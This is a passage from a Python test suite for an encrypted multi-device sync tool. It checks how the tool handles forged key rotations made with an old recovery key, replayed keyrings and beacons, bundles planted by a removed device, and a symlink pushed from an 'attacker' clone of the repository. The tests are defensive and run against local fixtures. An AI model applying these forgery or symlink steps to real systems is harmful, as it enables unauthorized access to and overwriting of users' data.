    (remote / "k" / f"{pinned['rev']:08d}.json").write_text(json.dumps(pinned))
    check("the new recovery key doesn't open the old history the removed device put back",
          refused(lambda: device("n-replay").recover({**folder, "recovery_key": key, "name": "New Mac"}), "doesn't open", "wrong_recovery_key")[0])
    for p in (remote / "k").iterdir():
        p.unlink()
    for n, data in keep_k.items():
        (remote / "k" / n).write_bytes(data)
    ring_path.write_bytes(keep_ring)
    check("the old recovery key no longer opens this sync", refused(lambda: device("n-old").recover({**folder, "recovery_key": old_key, "name": "Old key"}), "doesn't open", "wrong_recovery_key")[0])

    # ── the removed device forks the history for a phone that is joining ──
    j = device("j")
    code_j = a.pair()["code"]
    joined_j = j.join({**folder, "code": code_j, "name": "Phone"})
    a.sync()
    a.confirm_pair({"check": joined_j["check"]})
    jm = next(m for m in json.loads(ring_path.read_text())["members"] if m["id"] == j.settings["device"]["id"])
    fork = {**pinned, "members": sorted(pinned["members"] + [{**jm, "added_by": c_id}], key=lambda m: m["id"]),
            "wraps": {**pinned["wraps"], jm["id"]: sync.b64(sync.encrypt(old_keys.key, [jm["recipient"]]))}, "signer": c_id, "handover": ""}
    fork = {**fork, "rev": pinned["rev"] + 1, "prev": sync.digest(pinned), "sig": ""}
    fork["sig"] = c._sign_as_device(sync.unsigned(fork))
    keep_k = {p.name: p.read_bytes() for p in (remote / "k").iterdir()}
    keep_ring = ring_path.read_bytes()
    for p in (remote / "k").iterdir():
        p.unlink()
    (remote / "k" / f"{fork['rev']:08d}.json").write_text(json.dumps(fork))
    (remote / "k" / f"{pinned['rev']:08d}.json").write_text(json.dumps(pinned))
    ring_path.write_text(json.dumps(fork))
    j.sync()
    check("a joining phone refuses a fork when the keyring that added it is missing, and takes no key", not j.settings.get("enabled") and "nothing was taken" in err(j), err(j))
    for p in (remote / "k").iterdir():
        p.unlink()
    for n, data in keep_k.items():
        (remote / "k" / n).write_bytes(data)
    ring_path.write_text(json.dumps(fork))
    j.sync()
    check("and refuses a fork that doesn't pass through the keyring that added it", not j.settings.get("enabled"), err(j))
    ring_path.write_bytes(keep_ring)
    j.sync()
    check("with the real keyring back, the phone joins under the new key", j.settings.get("enabled") and j._data().key == a._data().key and j._data().key != old_keys.key)
    j.off({})
    a.sync()
    b.sync()

    # ── the removed device puts back the keyring a laggard last accepted ──
    pin_b = (b.state_dir / "keyring.json").read_bytes()
    pin_bj = json.loads(pin_b)
    laggard = device("lag")
    pair(a, laggard, folder, "Laggard")
    for engine in (a, b, laggard):
        engine.sync()
    pin_lag = (laggard.state_dir / "keyring.json").read_bytes()
    lag_keys = laggard._data()
    removed_b = a.remove_device({"id": b_id, "recovery_key": key})
    key = removed_b["recovery_key"]
    ring_path.write_bytes(pin_lag)  # b, removed, puts back what the laggard last accepted, before it syncs
    append(laggard, ALPHA, f"the laggard's line after the removal {SECRET}-4")
    lag_seq = laggard.st["seq"]
    laggard.sync()
    check("a laggard shown the keyring it last accepted sends nothing, because A's signed beacon names a newer one",
          laggard.st["seq"] == lag_seq and laggard.status()["error_kind"] == "paused", (laggard.st["seq"], lag_seq, err(laggard)))
    beacon_a = remote / sync.beacon_name(a.settings["device"]["id"])
    kept_beacon = beacon_a.read_bytes()
    beacon_a.unlink()
    laggard.sync()
    check("and still sends nothing when the removed device deletes that beacon", laggard.st["seq"] == lag_seq and laggard.status()["error_kind"] == "paused", err(laggard))
    beacon_a.write_bytes(kept_beacon)
    a.sync()
    laggard.sync()
    check("the laggard takes the real keys but sends nothing until the person says yes", laggard.st["seq"] == 0 and laggard.status()["pending_rotation"]["removed"] == ["Device B"], laggard.status())
    yes(laggard)
    laggard.sync()
    check("once the real keyring is back, the laggard follows and sends under the new key", laggard._data().epoch == lag_keys.epoch + 1 and laggard.st["seq"] > lag_seq, (err(laggard), laggard.st["seq"]))
    ok_sync(a, "A takes the laggard's line")
    check("A gets the laggard's line", f"{SECRET}-4" in lines(a, ALPHA))

    # ── a removed device that knows an OLD recovery key forks the rotation (review pass 3) ──
    hr = ROOT / "h-remote"
    hf = {"backend": "folder", "path": str(hr)}
    h1, h2, h3 = device("h1"), device("h2"), device("h3")
    make_store(h1, ALPHA, "h line")
    rk0 = h1.setup({**hf, "name": "H one"})["recovery_key"]
    pair(h1, h2, hf, "H two")
    pair(h1, h3, hf, "H three")
    for engine in (h1, h2, h3, h1, h2, h3):
        engine.sync()
    pin_h2 = h2._pinned()
    h2_keys = h2._data()
    rk1 = h1.remove_device({"id": h3.settings["device"]["id"], "recovery_key": rk0})["recovery_key"]
    real_h = json.loads((hr / "keyring.json").read_text())
    rid = json.loads((hr / "remote.json").read_text())["id"]
    old_root, _ = h3._open_recovery(sync.read_code(rk0, 8, "r"), rid, pin_h2)  # h3 saw rk0 once
    xpub, xpriv = sync.new_root(ROOT / "hx")
    kx = sync.Keys(secrets.token_bytes(32), pin_h2["epoch"] + 1)
    forged_h = {**pin_h2, "epoch": kx.epoch, "kid": kx.kid, "root": xpub, "wraps": {m["id"]: sync.b64(sync.encrypt(kx.key, [m["recipient"]])) for m in pin_h2["members"]},
                "signer": "root", "rev": pin_h2["rev"] + 1, "prev": sync.digest(pin_h2), "sig": "", "handover": "", "body": h3._seal_body({"devices": {}, "removed": []}, kx)}
    with sync.RootKey(xpriv, ROOT / "hx") as x, sync.RootKey(old_root, ROOT / "hx") as old:
        forged_h["sig"] = x.sign(sync.unsigned(forged_h))
        forged_h["handover"] = old.sign(sync.unsigned(forged_h))
    check("the forged rotation sits at exactly the real one's step", sync.ring_order(forged_h) == sync.ring_order(real_h))
    (hr / "keyring.json").write_text(json.dumps(forged_h))
    (hr / "k" / f"{forged_h['rev']:08d}.json").write_text(json.dumps(forged_h))
    h3_id = h3.settings["device"]["id"]
    signed = {"device": h3_id, "ring": [forged_h["epoch"], forged_h["rev"]], "digest": sync.digest(forged_h), "at": time.time()}
    (hr / sync.beacon_name(h3_id)).write_text(json.dumps({**signed, "sig": h3._sign_as_device(sync.canonical(signed))}))
    append(h2, ALPHA, f"h two after the removal {SECRET}-5")
    seq_h2 = h2.st["seq"]
    h2.sync()
    check("a laggard shown a forged handover at the real rotation's step sends nothing, and asks the person", h2.status()["error_kind"] in ("fork", "pending_rotation") and h2.st["seq"] == 0, (err(h2), h2.status()["error_kind"]))
    check("the laggard didn't write over the fork", json.loads((hr / "keyring.json").read_text()) == forged_h)
    if h2.pending_view():
        h2.reject_rotation({"id": h2.pending_view()["id"]})
    check("No puts the laggard back on its own keys and its own keyring", h2._data().key == h2_keys.key and sync.digest(h2._pinned()) == sync.digest(pin_h2) and h2.st["seq"] == seq_h2)
    h2.sync()
    check("and from then on it refuses that branch, as a fork, and sends nothing", h2.status()["error_kind"] == "fork" and h2.st["seq"] == seq_h2, (err(h2), h2.status()["error_kind"]))
    h1.sync()
    check("the device that made the removal sees the fork too, and doesn't write over it either",
          h1.status()["error_kind"] == "fork" and json.loads((hr / "keyring.json").read_text()) == forged_h, err(h1))
    check("settling it takes the newest recovery key", refused(lambda: h1.rotate({"recovery_key": rk0}), "", "wrong_branch")[0] or refused(lambda: h1.rotate({"recovery_key": rk0}), "doesn't open", "wrong_recovery_key")[0])
    rk2 = h1.rotate({"recovery_key": rk1})["recovery_key"]
    check("new keys over the fork, once access is taken away, give a new recovery key", len(rk2) == 39 and rk2 not in (rk0, rk1))
    h2.sync()
    check("the new keys over the fork reach the laggard as their own question", h2.status()["pending_rotation"] is not None, h2.status())
    yes(h2)
    h2.sync()
    check("the laggard then follows the real chain and holds the newest key", h2._data().key == h1._data().key and h2._data().epoch == real_h["epoch"] + 1 and not err(h2), err(h2))
    ok_sync(h1, "H one after settling")
    ok_sync(h2, "H two after settling")
    check("and its line written while paused arrives", f"{SECRET}-5" in lines(h1, ALPHA))

    # ── a device away for two removals catches up (k/ is kept) ──
    h4, h5 = device("h4"), device("h5")
    pair(h1, h4, hf, "H four")
    pair(h1, h5, hf, "H five")
    for engine in (h1, h2, h4, h5, h1, h2):
        engine.sync()
    rk3 = h1.remove_device({"id": h4.settings["device"]["id"], "recovery_key": rk2})["recovery_key"]
    rk4 = h1.remove_device({"id": h5.settings["device"]["id"], "recovery_key": rk3})["recovery_key"]
    h2.sync()
    yes(h2)
    h2.sync()
    check("a device away for two removals walks both handovers, asks once, and holds the newest key", h2._data().key == h1._data().key and not err(h2), err(h2))

    # ── a member that added a device can't leave while it stays (laundering) ──
    h6 = device("h6")
    pair(h1, h6, hf, "H six")
    for engine in (h1, h2, h6):
        engine.sync()
    h6_id = h6.settings["device"]["id"]
    ward = device("ward")
    ward._private(ward.dir)
    ward_dev = ward._new_device("Ward phone")
    pin6 = h6._pinned()
    h6._publish(h6._backend(h6.settings), pin6, {**pin6, "members": pin6["members"] + [h6._member(ward_dev, h6_id)],
                "wraps": {**pin6["wraps"], ward_dev["id"]: sync.b64(sync.encrypt(h6._data().key, [ward_dev["recipient"]]))}, "signer": h6_id}, h6._sign_as_device)
    for engine in (h1, h2, h6):
        engine.sync()
    check("turning sync off on a device that added another is refused, and changes nothing",
          refused(lambda: h6.off({}), "Remove it first", "has_added_devices")[0] and h6.settings.get("enabled"))
    pin6 = h6._pinned()
    leave = {**pin6, "members": [m for m in pin6["members"] if m["id"] != h6_id], "wraps": {k: v for k, v in pin6["wraps"].items() if k != h6_id}, "signer": h6_id}
    real6 = (hr / "keyring.json").read_bytes()
    h6._publish(h6._backend(h6.settings), pin6, leave, h6._sign_as_device)
    h1.sync()
    check("a keyring in which a device leaves while a device it added stays is refused", "while devices it added stay" in err(h1), err(h1))
    (hr / "keyring.json").write_bytes(real6)
    h1.sync()
    preview = h1.remove_device({"id": h6_id, "preview": True})
    check("a removal can be previewed without the recovery key, listing what goes with it",
          preview.get("also_removed") and preview["also_removed"][0]["id"] == ward_dev["id"] and preview["also_removed"][0]["added_by"] == "H six", preview)
    check("the preview changed nothing", json.loads((hr / "keyring.json").read_text()) == json.loads(real6) or h1._pinned()["rev"] == json.loads(real6)["rev"])

    # ── review pass 4: the person is the gate for keys another device made ──
    def trio(tag):
        where = {"backend": "folder", "path": str(ROOT / f"{tag}-remote")}
        x, y, z = device(f"{tag}1"), device(f"{tag}2"), device(f"{tag}3")
        make_store(x, ALPHA, f"{tag} line")
        first = x.setup({**where, "name": f"{tag.upper()} one"})["recovery_key"]
        pair(x, y, where, f"{tag.upper()} two")
        pair(x, z, where, f"{tag.upper()} three")
        for engine in (x, y, z, x, y, z):
            engine.sync()
        return where, x, y, z, first

    # a removed device that saw the old recovery key forges the rotation and replays the remover's old beacon
    fw, f1, f2, f3, fk0 = trio("f")
    fr = Path(fw["path"])
    old_beacons = {p.name: p.read_bytes() for p in (fr / "o").iterdir()}
    pin_f2, f2_keys = f2._pinned(), f2._data()
    fk1 = f1.remove_device({"id": f3.settings["device"]["id"], "recovery_key": fk0})["recovery_key"]
    real_f = json.loads((fr / "keyring.json").read_text())
    rid_f = json.loads((fr / "remote.json").read_text())["id"]
    old_root_f, _ = f3._open_recovery(sync.read_code(fk0, 8, "r"), rid_f, pin_f2)
    fx_pub, fx_priv = sync.new_root(ROOT / "fx")
    fx = sync.Keys(secrets.token_bytes(32), pin_f2["epoch"] + 1)
    f1_id, f3_id = f1.settings["device"]["id"], f3.settings["device"]["id"]
    keep_f = [m for m in pin_f2["members"] if m["id"] != f1_id]  # C chooses the member list: it "removes" A
    body_f = f3._body(pin_f2, f3._data())
    body_f["rotated"] = {"by": f3_id, "at": "2026-11-26T00:00:00Z", "epoch": fx.epoch}
    body_f["removed"] = [{"id": f1_id, "name": "F one", "epoch": fx.epoch, "by": f3_id}]  # a body that agrees with the signed lists
    forged_f = {**pin_f2, "epoch": fx.epoch, "kid": fx.kid, "root": fx_pub, "members": keep_f, "wraps": {m["id"]: sync.b64(sync.encrypt(fx.key, [m["recipient"]])) for m in keep_f},
                "signer": "root", "rev": pin_f2["rev"] + 1, "prev": sync.digest(pin_f2), "sig": "", "handover": "", "body": f3._seal_body(body_f, fx)}
    with sync.RootKey(fx_priv, ROOT / "fx") as x, sync.RootKey(old_root_f, ROOT / "fx") as old:
        forged_f["sig"] = x.sign(sync.unsigned(forged_f))
        forged_f["handover"] = old.sign(sync.unsigned(forged_f))
    (fr / "keyring.json").write_text(json.dumps(forged_f))
    (fr / "k" / f"{forged_f['rev']:08d}.json").write_text(json.dumps(forged_f))
    a_beacon = sync.beacon_name(f1_id).split("/")[1]
    (fr / "o" / a_beacon).write_bytes(old_beacons[a_beacon])  # the remover's beacon from before the removal
    signed = {"device": f3_id, "ring": [forged_f["epoch"], forged_f["rev"]], "digest": sync.digest(forged_f), "at": time.time()}
    (fr / sync.beacon_name(f3_id)).write_text(json.dumps({**signed, "sig": f3._sign_as_device(sync.canonical(signed))}))
    append(f2, ALPHA, f"f two after the removal {SECRET}-6")
    f2.sync()
    view = f2.status()["pending_rotation"]
    check("a forged rotation that fools every beacon check still waits for the person, who sees from the signed lists whom it removed and who keeps syncing",
          view and view["removed"] == ["F one"] and view["keeps"] == ["F three", "This Mac"] and f2.status()["error_kind"] == "pending_rotation", view)
    check("while it waits, nothing is sent under the forged key", f2.st.get("seq", 0) == 0 and not (fr / fx.name("head", f2.settings["device"]["id"])).exists())
    f2.reject_rotation({"id": view["id"]})
    check("No puts the device back on its own key and keyring", f2._data().key == f2_keys.key and sync.digest(f2._pinned()) == sync.digest(pin_f2))
    f2.sync()
    check("and that branch is refused from then on, as a fork, sending nothing", f2.status()["error_kind"] == "fork" and not (fr / fx.name("head", f2.settings["device"]["id"])).exists(), err(f2))
    check("a yes or no with nothing waiting is refused", refused(lambda: f2.ack_rotation({"id": view["id"]}), "No new keys", "nothing_pending")[0])

    # a device that said yes to the forged keys by mistake can't make new keys with the newest recovery key, and is told why
    gw, g1d, g2d, g3d, gk0 = trio("q")
    gr = Path(gw["path"])
    pin_g2 = g2d._pinned()
    gk1 = g1d.remove_device({"id": g3d.settings["device"]["id"], "recovery_key": gk0})["recovery_key"]
    old_root_g, _ = g3d._open_recovery(sync.read_code(gk0, 8, "r"), json.loads((gr / "remote.json").read_text())["id"], pin_g2)
    gx_pub, gx_priv = sync.new_root(ROOT / "gx")
    gx = sync.Keys(secrets.token_bytes(32), pin_g2["epoch"] + 1)
    forged_g = {**pin_g2, "epoch": gx.epoch, "kid": gx.kid, "root": gx_pub, "wraps": {m["id"]: sync.b64(sync.encrypt(gx.key, [m["recipient"]])) for m in pin_g2["members"]},
                "signer": "root", "rev": pin_g2["rev"] + 1, "prev": sync.digest(pin_g2), "sig": "", "handover": "", "body": g3d._seal_body({"devices": {}, "removed": []}, gx)}
    with sync.RootKey(gx_priv, ROOT / "gx") as x, sync.RootKey(old_root_g, ROOT / "gx") as old:
        forged_g["sig"] = x.sign(sync.unsigned(forged_g))
        forged_g["handover"] = old.sign(sync.unsigned(forged_g))
    real_g = (gr / "keyring.json").read_bytes()
    (gr / "keyring.json").write_text(json.dumps(forged_g))
    (gr / "k" / f"{forged_g['rev']:08d}.json").write_text(json.dumps(forged_g))
    g2d.sync()
    yes(g2d)
    (gr / "keyring.json").write_bytes(real_g)
    g2d._save_settings({**g2d.settings, "created": True})  # as the installed hub would be; a second instance may not make keys on a remote it didn't set up
    check("on keys someone else made, making new keys with the newest recovery key says so, with its own reason",
          refused(lambda: g2d.rotate({"recovery_key": gk1}), "turn sync off here and join again", "wrong_branch")[0])

    # a No puts back what was fetched while it waited, and nothing was merged
    rw, r1, r2, r3, rk_0 = trio("r")
    r2_head = git(r2.stores / ALPHA, "rev-parse", "HEAD")
    r1.remove_device({"id": r3.settings["device"]["id"], "recovery_key": rk_0})
    append(r1, ALPHA, f"r one after the removal {SECRET}-7")
    r1.sync()
    r1_id = r1.settings["device"]["id"]
    ref_before = git(r2.stores / ALPHA, "rev-parse", f"refs/sync/{r1_id}")
    r2.sync()
    check("while new keys wait for the person, what arrives is fetched but not merged", f"{SECRET}-7" not in lines(r2, ALPHA) and git(r2.stores / ALPHA, "rev-parse", "HEAD") == r2_head)
    fetched = git(r2.stores / ALPHA, "rev-parse", f"refs/sync/{r1_id}")
    r2.reject_rotation({"id": r2.pending_view()["id"]})
    check("No puts the fetched ref back", fetched != ref_before and git(r2.stores / ALPHA, "rev-parse", f"refs/sync/{r1_id}") == ref_before)

    # a removed device with no recovery key signs a beacon at the real step: not a fork, and the person settles it
    bw, b1, b2, b3, bk0 = trio("b")
    br = Path(bw["path"])
    bk1 = b1.remove_device({"id": b3.settings["device"]["id"], "recovery_key": bk0})["recovery_key"]
    real_b = json.loads((br / "keyring.json").read_text())
    b3_id = b3.settings["device"]["id"]
    signed = {"device": b3_id, "ring": [real_b["epoch"], real_b["rev"]], "digest": "0" * 64, "at": time.time()}
    (br / sync.beacon_name(b3_id)).write_text(json.dumps({**signed, "sig": b3._sign_as_device(sync.canonical(signed))}))
    b2.sync()
    check("a removed device's beacon naming keys that aren't on the remote is not a fork; the person is asked", b2.status()["error_kind"] == "pending_rotation", (err(b2), b2.status()["error_kind"]))
    yes(b2)
    b2.sync()
    check("after the person's yes it syncs under the real key", b2._data().key == b1._data().key and b2.status()["error_kind"] in (None, "stale"), err(b2))

    # names: lookalikes and the same name in another case
    check("a name that mixes alphabets is refused", refused(lambda: device("look").join({**bw, "code": "2222-2222-2222-2222-2222-2222", "name": "B tw\u043e"}), "alphabets", "name_lookalike")[0])
    check("a name that differs only in case or width from one in sync is refused at recovery",
          refused(lambda: device("nm2").recover({**bw, "recovery_key": bk1, "name": "B ＯＮＥ"}), "already in sync", "name_taken")[0])
    check("name hashes fold case and width", sync.name_hash("B one") == sync.name_hash("Ｂ  ONE"))

    # ── review pass 5: the question says only what the signed lists say; held bundles follow the answer ──
    def forge(tag, where, one, two, three, k0, keep_all, body_edit):
        """three, removed by one but holding the old recovery key, makes keys at the real rotation's step."""
        rmt = Path(where["path"])
        pin = two._pinned()
        old_root, _ = three._open_recovery(sync.read_code(k0, 8, "r"), json.loads((rmt / "remote.json").read_text())["id"], pin)
        xp, xk = sync.new_root(ROOT / f"{tag}x")
        kx = sync.Keys(secrets.token_bytes(32), pin["epoch"] + 1)
        keep = pin["members"] if keep_all else [m for m in pin["members"] if m["id"] != one.settings["device"]["id"]]
        body = three._body(pin, three._data())
        body_edit(body, kx.epoch)
        ring_x = {**pin, "epoch": kx.epoch, "kid": kx.kid, "root": xp, "members": keep, "wraps": {m["id"]: sync.b64(sync.encrypt(kx.key, [m["recipient"]])) for m in keep},
                  "signer": "root", "rev": pin["rev"] + 1, "prev": sync.digest(pin), "sig": "", "handover": "", "body": three._seal_body(body, kx)}
        with sync.RootKey(xk, ROOT / f"{tag}x") as x, sync.RootKey(old_root, ROOT / f"{tag}x") as old:
            ring_x["sig"] = x.sign(sync.unsigned(ring_x))
            ring_x["handover"] = old.sign(sync.unsigned(ring_x))
        (rmt / "keyring.json").write_text(json.dumps(ring_x))
        (rmt / "k" / f"{ring_x['rev']:08d}.json").write_text(json.dumps(ring_x))
        return ring_x, kx

    # the forger writes "one removed three" in the body while three stays in the signed list
    mw, m1, m2, m3, mk0 = trio("m")
    m2_keys = m2._data()
    m1.remove_device({"id": m3.settings["device"]["id"], "recovery_key": mk0})
    m1_id, m3_id = m1.settings["device"]["id"], m3.settings["device"]["id"]

    def mimic(body, epoch):
        body["removed"] = body.get("removed", []) + [{"id": m3_id, "name": "M three", "at": "2026-11-26T00:00:00Z", "by": m1_id, "epoch": epoch}]
        body["rotated"] = {"by": m1_id, "at": "2026-11-26T00:00:00Z", "epoch": epoch}
    forge("m", mw, m1, m2, m3, mk0, True, mimic)
    m2.sync()
    check("keys whose body says a device was removed that the signed list still holds are refused as forged, and never asked about",
          m2.status()["pending_rotation"] is None and m2.status()["error_kind"] == "fork" and m2._data().key == m2_keys.key, (err(m2), m2.status()["pending_rotation"]))

    # the forger keeps itself in and says nothing false: the question shows it among those who keep syncing
    kw, k1, k2, k3, kk0 = trio("k")
    k1.remove_device({"id": k3.settings["device"]["id"], "recovery_key": kk0})
    k3_id = k3.settings["device"]["id"]

    def quiet(body, epoch):
        body["rotated"] = {"by": k3_id, "at": "2026-11-26T00:00:00Z", "epoch": epoch}
    ring_k, kxk = forge("k", kw, k1, k2, k3, kk0, True, quiet)
    k2.sync()
    view = k2.status()["pending_rotation"]
    check("the question lists, from the signed lists, who keeps syncing: the removed device that made the forgery shows there",
          view and view["removed"] == [] and "K three" in view["keeps"], view)

    # a bundle held for a store that was off while the question waited goes with a No, and is never merged
    k2.set_store({"name": BETA, "synced": False})
    evil_root = ROOT / "evilroot"
    planted_src = type("E", (), {"stores": evil_root})()
    make_store(planted_src, BETA, f"planted by the removed device {SECRET}-8")
    src = evil_root / BETA
    bundle_path = ROOT / "evil.bundle"
    git(src, "bundle", "create", "-q", str(bundle_path), "HEAD")
    header = {"v": 1, "epoch": kxk.epoch, "store": BETA, "device": k3_id, "seq": 1, "prev": "", "at": time.time(), "branch": "main", "head": git(src, "rev-parse", "HEAD").strip(), "full": True}
    plain = sync.canonical(header) + b"\n" + bundle_path.read_bytes()
    kr = Path(kw["path"])
    bn = kxk.name("bundle", k3_id, "1")
    (kr / bn).write_bytes(kxk.pack(bn, plain))
    hn = kxk.name("head", k3_id)
    (kr / hn).write_bytes(kxk.pack(hn, sync.canonical({"device": k3_id, "epoch": kxk.epoch, "seq": 1, "hash": hashlib.sha256(plain).hexdigest(), "at": time.time()})))
    k2.sync()
    held_now = list((k2.state_dir / "held").rglob("*.bundle")) if (k2.state_dir / "held").exists() else []
    check("the forged device's bundle is held for the store that is off", len(held_now) == 1)
    k2.set_store({"name": BETA, "synced": True})
    k2.sync()
    check("turning the store on while the question waits merges nothing that came under the waiting keys", not (k2.stores / BETA).exists() or f"{SECRET}-8" not in lines(k2, BETA))
    k2.set_store({"name": BETA, "synced": False})
    k2.reject_rotation({"id": k2.pending_view()["id"]})
    check("No throws away what was held under the refused keys", not list((k2.state_dir / "held").rglob("*.bundle")) if (k2.state_dir / "held").exists() else True)
    k2.set_store({"name": BETA, "synced": True})
    k2.sync()
    k2.sync()
    check("and turning the store on afterwards brings none of it", not (k2.stores / BETA).exists() or f"{SECRET}-8" not in lines(k2, BETA))

    # the other order: a real removal, a held bundle, Yes, then the store on
    yw, y1, y2, y3, yk0 = trio("y")
    make_store(y1, BETA, "y beta")
    y1.sync()
    y2.sync()
    y2.set_store({"name": BETA, "synced": False})
    y1.remove_device({"id": y3.settings["device"]["id"], "recovery_key": yk0})
    append(y1, BETA, f"y one after the removal {SECRET}-9")
    y1.sync()
    y2.sync()
    check("a real removal's bundle for a store that is off is held while the question waits", bool(list((y2.state_dir / "held").rglob("*.bundle"))))
    yes(y2)
    y2.set_store({"name": BETA, "synced": True})
    y2.sync()
    y2.sync()
    check("after Yes, turning the store on brings it in", f"{SECRET}-9" in lines(y2, BETA), err(y2))

    # a device with an open question that makes new keys itself: the question goes
    zw, z1, z2, z3, zk0 = trio("z")
    zk1 = z1.remove_device({"id": z3.settings["device"]["id"], "recovery_key": zk0})["recovery_key"]
    z2.sync()
    check("the question is open on the device that didn't make the removal", z2.pending_view() is not None)
    z2._save_settings({**z2.settings, "created": True})  # as the installed hub would be
    z2.rotate({"recovery_key": zk1})
    check("making new keys itself clears it", z2.pending_view() is None)

    # ── every other device silent for over a week ──
    lazy_clock = Clock()
    h7 = device("h7", clock=lazy_clock)
    pair(h1, h7, hf, "H seven")
    h7.sync()
    h1.remove_device({"id": h6_id, "recovery_key": rk4})
    h2.off({})
    h1.sync()
    h7.sync()
    yes(h7)
    h7.sync()
    lazy_clock.shift = 8 * 86400
    h7.sync()
    check("when every other device's beacon is over a week old, sync says so (stale), and doesn't stop", h7.status()["error_kind"] == "stale" and not h7.hold, (err(h7), h7.status()["error_kind"]))

    # ── a keyring race: compare-and-swap ──
    stale = a._pinned()
    d_engine = device("d-race")
    pair(a, d_engine, folder, "Racer")
    check("a keyring write based on an older keyring is refused with reason retry",
          refused(lambda: b._publish(b._backend(b.settings), stale, {**stale, "signer": b_id}, b._sign_as_device), "changed on another device meanwhile", "retry")[0])
    d_engine.off({})
    a.sync()

    # ── recovery ──
    d = device("d")
    check("a mistyped recovery key is refused", refused(lambda: device("d1").recover({**folder, "recovery_key": "-".join(["ABCD"] * 8), "name": "Typo"}), "doesn't open", "wrong_recovery_key")[0])
    d.recover({**folder, "recovery_key": key, "name": "Device D"})  # the newest recovery key
    ok_sync(d, "D after recovery")
    check("D, restored with the recovery key, has every store", f"{SECRET}-2" in lines(d, ALPHA) and "while B had beta off" in lines(d, BETA))
    a.sync()
    check("the device that recovered is listed on the others, added with the recovery key",
          [x["added_by"] for x in a.status()["devices"] if x["name"] == "Device D"] == ["recovery"], a.status()["devices"])

    # ── off ──
    check("forgetting the remote needs the recovery key", refused(lambda: a.off({"forget_remote": True}), "recovery key")[0] and a.settings.get("enabled"))
    d.off({"forget_remote": False})
    check("off removes this device's keys and settings", not d.keys_dir.exists() and not d.settings and not d.status()["enabled"])
    a.sync()
    check("the device that left is no longer listed", "Device D" not in [x["name"] for x in a.status()["devices"]], a.status()["devices"])

    # ── off works on state an earlier build left behind ──
    stale_dev = device("stale")
    pair(a, stale_dev, folder, "Stale")
    old_pin = json.loads((stale_dev.state_dir / "keyring.json").read_text())
    for member in old_pin["members"]:
        member.pop("name_hash")  # the shape before af24460
    (stale_dev.state_dir / "keyring.json").write_text(json.dumps(old_pin))
    try:
        stale_dev.off({})
        outcome = "ok"
    except Refused as problem:
        outcome = str(problem)
    except Exception as problem:
        outcome = f"crashed: {type(problem).__name__}"
    check("off works on a pinned keyring in an older shape, and still clears this device", not outcome.startswith("crashed") and not stale_dev.settings and not stale_dev.keys_dir.exists(), outcome)
    stale_dev2 = device("stale2")
    pair(a, stale_dev2, folder, "Stale two")
    (stale_dev2.state_dir / "sync-state.json").write_text("{")
    try:
        stale_dev2.off({})
        outcome = "ok"
    except Refused as problem:
        outcome = str(problem)
    except Exception as problem:
        outcome = f"crashed: {type(problem).__name__}"
    check("off works on a state file that is half written, and still clears this device", not outcome.startswith("crashed") and not stale_dev2.settings, outcome)
    a.sync()

    # ── a second instance may not wipe or re-key a remote it didn't set up ──
    live_remote = ROOT / "live-remote"
    live = device("live", second=False)
    make_store(live, "a-real-looking-store", "real memory")
    live_key = live.setup({"backend": "folder", "path": str(live_remote), "name": "Live"})["recovery_key"]
    live.sync()
    tester = device("tester")
    before = sorted(str(p.relative_to(live_remote)) for p in remote_files(live_remote))
    live.pair()
    check("a second instance can't join a sync the installed hub set up", refused(lambda: tester.join({"backend": "folder", "path": str(live_remote), "code": live.pairing["code"], "name": "T"}),
          "second instance", "second_instance")[0])
    check("nor recover into one", refused(lambda: device("tester2").recover({"backend": "folder", "path": str(live_remote), "recovery_key": live_key, "name": "T"}), "second instance", "second_instance")[0])
    live.cancel_pair()
    joined_tester = device("tester3")
    check("a second instance that didn't set a remote up can't confirm a device there either",
          refused(lambda: (joined_tester._save_settings({"backend": "folder", "path": str(remote), "enabled": True, "created": False, "device": {"id": "0" * 16, "name": "x"}}),
                           joined_tester.confirm_pair({"check": "123456"})), "set up itself", "second_instance")[0])
    check("the live remote is untouched", sorted(str(p.relative_to(live_remote)) for p in remote_files(live_remote)) == before)
    check("a second instance looks for its own GitHub repo name, never the installed hub's",
          tester._backend({"backend": "github"}).repo_name == sync.TEST_REPO and live._backend({"backend": "github"}).repo_name == sync.REPO)

    # ── the GitHub backend, against a local bare repo ──
    bare = ROOT / "fake-github.git"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(bare)], check=True)
    g1, g2 = device("g1", github=str(bare)), device("g2", github=str(bare))
    make_store(g1, ALPHA, f"github line {SECRET}")
    gh_key = g1.setup({"backend": "github", "name": "Gadget One Device"})["recovery_key"]
    ok_sync(g1, "G1 sends to the bare repo")
    pair(g1, g2, {"backend": "github"}, "Gadget Two Device")
    ok_sync(g2, "G2 takes from the bare repo")
    check("over the git backend the store arrives", SECRET in lines(g2, ALPHA))
    append(g2, ALPHA, "from g2")
    append(g1, ALPHA, "from g1")
    ok_sync(g2, "G2 sends")
    ok_sync(g1, "G1 merges")
    ok_sync(g2, "G2 merges")
    check("over the git backend no line is lost", all(w in lines(g2, ALPHA) for w in ("from g1", "from g2")) and "from g2" in lines(g1, ALPHA))
    history = subprocess.run(["git", "--git-dir", str(bare), "log", "--all", "-p", "--format=%an %ae %s"], capture_output=True).stdout
    check("the repo's whole history holds no store name, no plaintext and no device name",
          not any(w.encode() in history for w in (ALPHA, SECRET, "Gadget One", "Gadget Two", "gotchas")))
    paths = subprocess.run(["git", "--git-dir", str(bare), "log", "--all", "--format=", "--name-only"], capture_output=True, text=True).stdout.split()
    blobs_p = []
    for rev in subprocess.run(["git", "--git-dir", str(bare), "rev-list", "--all"], capture_output=True, text=True).stdout.split():
        for path in {p for p in paths if p.startswith("p/")}:
            shown = subprocess.run(["git", "--git-dir", str(bare), "show", f"{rev}:{path}"], capture_output=True)
            if shown.returncode == 0:
                blobs_p.append(shown.stdout)
    data_key = g1._data().key
    check("no pairing file ever in the repo's history holds the data key or a wrap of it",
          blobs_p and not any(b"wrap" in blob or data_key in blob or data_key.hex().encode() in blob for blob in blobs_p), len(blobs_p))
    attacker = ROOT / "attacker-clone"
    subprocess.run(["git", "clone", "-q", str(bare), str(attacker)], check=True)
    victim2 = ROOT / "victim2"
    victim2.mkdir()
    (victim2 / "a.txt").write_text("precious")
    git(attacker, "rm", "-rq", "o")
    os.symlink(victim2, attacker / "o")
    git(attacker, "add", "o")
    git(attacker, "commit", "-qm", "x")
    git(attacker, "push", "-q", "origin", "HEAD:main")
    g1.sync()
    check("a link committed to the repo arrives as no link, and is refused", "is a link or not a folder" in err(g1), err(g1))
